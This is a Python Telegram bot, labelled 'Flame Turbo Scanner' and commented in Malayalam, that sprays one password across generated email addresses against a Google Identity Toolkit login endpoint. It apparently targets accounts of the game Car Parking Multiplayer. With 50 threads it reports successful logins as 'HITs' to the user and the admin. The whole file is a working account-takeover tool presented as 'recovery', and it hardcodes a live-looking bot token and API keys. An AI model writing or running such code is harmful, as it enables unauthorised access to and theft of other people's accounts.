import telebot
import requests
from telebot import types
from threading import Thread
from flask import Flask
import os
from concurrent.futures import ThreadPoolExecutor

# --- RENDER HEALTH CHECK SERVER ---
app = Flask('')

@app.route('/')
def home():
    return "⚡ FLAME TURBO SCANNER IS ONLINE!"

def run_flask():
    # Render നൽകുന്ന PORT തന്നെ ഉപയോഗിക്കുന്നു (ഇത് നിർബന്ധമാണ്)
    port = int(os.environ.get("PORT", 8080))
    app.run(host='0.0.0.0', port=port)

# --- BOT CONFIG ---
# നിന്റെ പുതിയ ടോക്കൺ ഇവിടെ ആഡ് ചെയ്തിട്ടുണ്ട്
TOKEN = "8574711169:AAEpY7ydcHy1nYoZnNVLi4w63HHnxNqamhM"
bot = telebot.TeleBot(TOKEN, threaded=True)

ADMIN_ID = 7212602902 

API_KEYS = {
    "CPM1": "AIzaSyAe_aOVT1gSfmHKBrorFvX4fRwN5nODXVA", 
    "CPM2": "AIzaSyCQDz9rgjgmvmFkvVfmvr2-7fT4tfrzRRQ"
}

user_states = {}
session = requests.Session()
adapter = requests.adapters.HTTPAdapter(pool_connections=100, pool_maxsize=100)
session.mount('https://', adapter)

# --- LOGIN LOGIC ---
def login_acc(email, password, version="CPM2"):
    try:
        url = f"https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword?key={API_KEYS[version]}"
        r = session.post(url, json={"email": email, "password": password, "returnSecureToken": True}, timeout=6)
        if r.status_code == 200: return email
    except: return None
    return None

# --- HANDLERS ---
@bot.message_handler(commands=['start'])
def start(message):
    if message.from_user.id != ADMIN_ID: return bot.send_message(message.chat.id, "🚫 Access Denied!")
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("🔍 Start Turbo Recovery", callback_data="mode_recover"))
    bot.send_message(message.chat.id, "🔥 **FLAME TURBO MASTER**", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data == "mode_recover")
def handle_recover(call):
    msg = bot.send_message(call.message.chat.id, "📧 Enter Format: (Ex: `cpm_{}_@gmail.com`)")
    bot.register_next_step_handler(msg, get_format)

def get_format(message):
    user_states[message.chat.id] = {'format': message.text.strip()}
    msg = bot.send_message(message.chat.id, "🔢 Enter Range: (Ex: `1000:2000`)")
    bot.register_next_step_handler(msg, get_range)

def get_range(message):
    try:
        s, e = map(int, message.text.split(':'))
        user_states[message.chat.id]['start'], user_states[message.chat.id]['end'] = s, e
        msg = bot.send_message(message.chat.id, "🔑 Enter Password:")
        bot.register_next_step_handler(msg, run_turbo)
    except: bot.send_message(message.chat.id, "❌ Format error! (Ex: 1000:2000)")

def run_turbo(message):
    cid, pwd = message.chat.id, message.text.strip()
    data = user_states.get(cid)
    bot.send_message(cid, f"🚀 Scanning {data['start']} to {data['end']}...")

    def task():
        emails = [data['format'].replace("{}", str(i)) for i in range(data['start'], data['end'] + 1)]
        with ThreadPoolExecutor(max_workers=50) as executor:
            results = list(executor.map(lambda e: login_acc(e, pwd), emails))
        
        found = [res for res in results if res]
        for f in found:
            bot.send_message(cid, f"✅ **HIT:** `{f}`")
            bot.send_message(ADMIN_ID, f"🔔 **LOG:** `{f}` Found!")
        bot.send_message(cid, f"🏁 Done! Found: {len(found)}")

    Thread(target=task).start()

# --- RUNNER ---
if __name__ == "__main__":
    # Flask Background Thread
    t = Thread(target=run_flask)
    t.daemon = True
    t.start()
    # Bot Start
    print("Bot is alive...")
    bot.infinity_polling(skip_pending=True)
